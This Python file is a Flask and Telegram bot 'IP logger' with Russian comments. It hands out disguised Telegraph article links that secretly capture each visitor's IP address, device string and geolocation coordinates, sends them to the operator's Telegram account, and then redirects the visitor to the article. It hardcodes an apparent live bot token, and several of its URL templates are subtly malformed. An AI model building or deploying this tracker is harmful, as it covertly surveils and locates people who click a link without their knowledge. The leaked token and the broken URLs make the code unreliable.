import telebot
import requests
from flask import Flask, request, redirect

# --- ТВОИ НАСТРОЙКИ ---
API_TOKEN = '8513483559:AAENitdFw7owc388Bc77ebszoFtk08U7PZ8'
ADMIN_ID = 8347374252 

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

# СТРАНИЦА С КНОПКОЙ АКТИВАЦИИ
@app.route('/')
def index():
    domain = request.host
    webhook_url = f"https://api.telegram.org{API_TOKEN}/setWebhook?url=https://{domain}/{API_TOKEN}"
    
    return f'''
    <html>
        <head><title>Logger Panel</title></head>
        <body style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; background: #121212; color: white;">
            <div style="text-align: center; border: 1px solid #333; padding: 40px; border-radius: 15px; background: #1e1e1e;">
                <h1>Статус: Бот на связи</h1>
                <p>Нажми кнопку ниже, чтобы привязать бота к этому домену</p>
                <a href="{webhook_url}" target="_blank" style="display: inline-block; padding: 15px 30px; background: #0088cc; color: white; text-decoration: none; border-radius: 8px; font-weight: bold; margin-top: 20px;">⚡ АКТИВИРОВАТЬ БОТА</a>
                <p style="margin-top: 20px; color: #888; font-size: 0.9em;">После нажатия должна появиться надпись "Webhook was set"</p>
            </div>
        </body>
    </html>
    '''

@app.route('/v/', defaults={'article_id': ''})
@app.route('/v/<path:article_id>')
def logger(article_id):
    # Получаем IP на Vercel
    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
    ua = request.headers.get('user-agent')
    
    geo_info = "📍 Данные GeoIP недоступны"
    try:
        r = requests.get(f"http://ip-api.com{ip}?lang=ru", timeout=5).json()
        if r.get('status') == 'success':
            geo_info = (f"🌍 Страна: {r.get('country')}\n"
                        f"🏙 Город: {r.get('city')}\n"
                        f"📡 Провайдер: {r.get('isp')}\n"
                        f"📍 Координаты: {r.get('lat')}, {r.get('lon')}")
    except: pass

    report = (f"🎯 *НОВЫЙ КЛИК!*\n\n"
              f"👤 *IP:* `{ip}`\n"
              f"{geo_info}\n"
              f"📱 *Устройство:* `{ua}`\n"
              f"🔗 *Путь:* `{article_id}`")
    
    try:
        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    except: pass
    
    return redirect(f"https://telegra.ph{article_id}")

@app.route('/' + API_TOKEN, methods=['POST'])
def get_message():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 Бот активен! Пришли ссылку на статью в Telegraph.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_link(message):
    path = message.text.split("telegra.ph/")[-1] if "telegra.ph/" in message.text else ""
    domain = request.host
    trap_link = f"https://{domain}/v/{path}"
    bot.send_message(message.chat.id, f"✅ *Твоя ловушка готова:*\n\n`{trap_link}`", parse_mode="Markdown")
